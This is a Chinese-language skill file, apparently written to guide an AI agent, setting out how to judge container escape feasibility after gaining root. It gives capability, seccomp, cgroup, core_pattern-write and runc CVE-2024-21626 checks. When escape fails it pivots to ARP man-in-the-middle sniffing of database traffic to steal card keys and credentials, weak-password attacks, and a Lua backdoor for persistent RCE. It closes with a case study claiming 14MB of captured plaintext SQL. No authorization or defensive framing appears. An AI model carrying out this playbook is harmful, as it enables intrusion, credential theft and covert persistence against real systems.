---
name: container-escape-assessment
description: 容器逃逸可行性评估方法论。用5项快速验证判断逃逸是否可行，避免在封闭环境浪费轮次，并给出转向建议。
---

# 容器逃逸可行性评估

> 触发条件：在容器内获得 root/高权限，想判断能否逃逸到宿主机。**先评估后投入**——多数生产容器逃逸面封闭，先花 2 分钟验证再决定是否深挖，否则 mount/nsenter 上浪费数小时。

## 一、5 项快速验证（拿到容器 root 后立即执行）

### 1. Capabilities 精确解析（最重要的陷阱）

```bash
cat /proc/self/status | grep CapEff
# 例: CapEff: 00000000a80425fb
```

**⚠️ 陷阱：hex 目测会误判。** 0xa80425fb 表面看起来位很多，但逐位解析后通常**不含** SYS_ADMIN/SYS_PTRACE/NET_ADMIN——这正是 mount/nsenter 全部失败的原因。必须用脚本逐位解析：

```bash
python3 - <<'EOF'
caps=int("a80425fb",16)  # 替换为实际 CapEff 值
names=["CHOWN","DAC_OVERRIDE","DAC_READ_SEARCH","FOWNER","FSETID","KILL","SETGID","SETUID","SETPCAP","LINUX_IMMUTABLE","NET_BIND_SERVICE","NET_BROADCAST","NET_ADMIN","NET_RAW","IPC_LOCK","IPC_OWNER","SYS_MODULE","SYS_RAWIO","SYS_CHROOT","SYS_PTRACE","SYS_PACCT","SYS_ADMIN","SYS_BOOT","SYS_NICE","SYS_RESOURCE","SYS_TIME","SYS_TTY_CONFIG","MKNOD","LEASE","AUDIT_WRITE","AUDIT_CONTROL","SETFCAP"]
print("ENABLED:", [n for i,n in enumerate(names) if caps>>i&1])
EOF
```

关键 cap → 逃逸路径：
- `SYS_ADMIN` → mount /dev/sda1、cgroup release_agent、core_pattern
- `SYS_PTRACE` → 注入宿主机进程 (gdb -p 1)
- `NET_ADMIN` → iptables、网络命名空间操作
- `NET_RAW` → ARP 欺骗 / 原始套接字嗅探（**即使逃逸封闭也保留，用于数据侧 MITM**）

### 2. Seccomp

```bash
grep Seccomp /proc/self/status   # 0=关闭 1=strict 2=filter mode
grep Seccomp_filters /proc/self/status  # >0 即有过滤，mount/nsenter 等被拒
```

### 3. cgroup 可写性

```bash
mount | grep cgroup   # ro=只读 → release_agent 逃逸不可用
ls -la /sys/fs/cgroup/
```

### 4. eBPF

```bash
cat /proc/sys/kernel/unprivileged_bpf_disabled  # 2=禁止（含特权容器内加载）
which bpftool
```

### 5. core_pattern 可写性

```bash
cat /proc/sys/kernel/core_pattern
echo test > /proc/sys/kernel/core_pattern 2>&1 && echo WRITABLE || echo READONLY
```

### 6. runc FD 泄露 (CVE-2024-21626)

```bash
for fd in $(seq 3 15); do readlink /proc/self/fd/$fd 2>/dev/null; done | grep -vE "socket|pipe|/proc|anon"
# 有指向宿主路径的 FD 才可利用
```

## 二、结论判据

**逃逸封闭**（直接放弃逃逸，转向数据侧）：
- 无 SYS_ADMIN + 无 SYS_PTRACE + Seccomp=2 + cgroup ro + core_pattern 只读 + eBPF 禁用

**可尝试**：
- 有 SYS_ADMIN / SYS_PTRACE / NET_ADMIN / 特权容器 / docker.sock / 宿主路径挂载 / 可利用 FD

## 三、逃逸封闭后的转向（数据侧）

逃逸无望 ≠ 白打。保留 NET_RAW 时：
- **ARP MITM + AF_PACKET 嗅探**：截获容器到 DB（PG/MySQL/Redis）的明文或 SCRAM 流量，可提取卡密/凭据/哈希
- **内网服务枚举**：容器内可达宿主机端口（8080/6379/5432/SSH），逐个尝试弱口令/未授权
- **NPM/面板类容器**：挂载宿主 /data 时读配置库（SQLite）、私钥、access log 找历史回调源 IP；反代 Lua 注入是常用持久 RCE

## 四、环境注意

- NPM 等精简镜像**无 bash /dev/tcp**：socket 连通性测试用 python3（`s.connect((host,port))` 二元组，勿展开）
- RCE 通道执行 python 脚本：**先 base64 编码整个脚本**，再用 `curl --data-urlencode "c=echo $B64 | base64 -d | python3"`——直接传 `python3 -c` 引号嵌套不稳

## 五、实战案例

NPM 容器 (0xa80425fb, Seccomp=2)：cap 实际仅 CHOWN/DAC_OVERRIDE/FOWNER/FSETID/KILL/SETGID/SETUID/SETPCAP/NET_BIND_SERVICE/NET_RAW/SYS_CHROOT/MKNOD/AUDIT_WRITE/SETFCAP。mount/nsenter/debugfs/core_pattern/eBPF/runc-FD 全部失败 → 逃逸封闭。转向 ARP MITM 截获 14MB PG 明文 SQL（含卡密），并通过 NPM 面板 + Lua 后门保持持久控制。
